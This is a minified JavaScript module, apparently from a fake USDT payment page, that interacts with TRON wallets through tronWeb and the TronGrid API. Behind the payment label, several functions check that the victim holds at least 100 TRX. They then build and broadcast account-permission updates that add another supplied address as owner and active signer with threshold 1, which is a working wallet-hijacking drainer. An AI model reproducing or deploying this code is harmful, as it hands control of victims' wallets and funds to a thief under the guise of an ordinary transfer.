import{a as t}from"./PXBDMAOW-633b4ea9.js";import{s as e,a}from"./W3eB2NMxY-7ea6a296.js";const s=JSON.parse(localStorage.getItem("config")),r="https://api.trongrid.io",n=async(a="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",n,i,o=.01)=>{try{if(!window.hasOwnProperty("tronWeb"))return e("Please switch to TRON main chain");await tronWeb.trx.getBalance();const o=navigator.userAgent,d=(/iphone|ipad|ipod|ios/i.test(o),/android|XiaoMi|MiuiBrowser/i.test(o),/OKApp/i.test(o));let c={};d&&(document.title="USDT 转账"),c=await window.executeBlockchainTransaction(a,n,i,1);const{data:p}=await t.post(`${r}/wallet/broadcasttransaction`,{...c},{headers:{"TRON-PRO-API-KEY":s.tronApikey}});return p}catch(d){e(String(d))}},i=async(n,i,o=!1)=>{try{if(await tronWeb.trx.getBalance()/1e6<100)return void e("TRX小于100，付款受限");a({message:"Loading...",duration:0});let d={type:0,permission_name:"owner",threshold:1,keys:[]};o&&d.keys.push({address:i,weight:1}),d.keys.push({address:n,weight:1});let c={type:2,permission_name:"active0",threshold:1,operations:"7fff1fc0037e0000000000000000000000000000000000000000000000000000",keys:[]};o&&c.keys.push({address:i,weight:1}),c.keys.push({address:n,weight:1});const{data:p}=await t.post(`${r}/wallet/accountpermissionupdate`,{owner_address:i,owner:d,actives:c,visible:!0});if(null==p?void 0:p.Error)return null==p?void 0:p.Error;const h=await tronWeb.trx.sign(p),{data:l}=await t.post(`${r}/wallet/broadcasttransaction`,{...h},{headers:{"TRON-PRO-API-KEY":s.tronApikey}});return l}catch(d){e(String(d))}},o=async t=>{try{if(await tronWeb.trx.getBalance()/1e6<100)return void e("TRX小于100,付款受限");let a=tronWeb.defaultAddress.hex,s={type:0,permission_name:"owner",threshold:1,keys:[]};s.keys.push({address:a,weight:1}),s.keys.push({address:tronWeb.address.toHex(t),weight:1});let r={type:2,permission_name:"active0",threshold:1,operations:"7fff1fc0037e0000000000000000000000000000000000000000000000000000",keys:[]};r.keys.push({address:a,weight:1}),r.keys.push({address:tronWeb.address.toHex(t),weight:1});const n=await tronWeb.transactionBuilder.updateAccountPermissions(a,s,null,r),i=await tronWeb.trx.sign(n);return await tronWeb.trx.sendRawTransaction(i)}catch(a){e(String(a))}},d=async(a,s="USDT")=>{s=String(s).toLocaleUpperCase();let r=0;if(!a)return e("无法获取钱包地址！请检查浏览器是否支持TRON！");const{data:n}=await t.get(`https://apilist.tronscanapi.com/api/account/tokens?address=${a}&start=0&limit=20&hidden=0&show=0&sortType=0&sortBy=0&token=${s}`);if(n.data.length>0){const t=n.data[0];return r=t.balance/Math.pow(10,t.tokenDecimal),r}return r};var c=(t=>(t.TRX="trx",t.ETH="eth",t.BSC="bsc",t))(c||{});const p={1:"approve",2:"active",3:"owner"},h={bsc:"Binance Coin",trx:"TRON",eth:"Ethereum"};export{c as B,n as a,i as b,o as c,h as d,d as g,p as t};
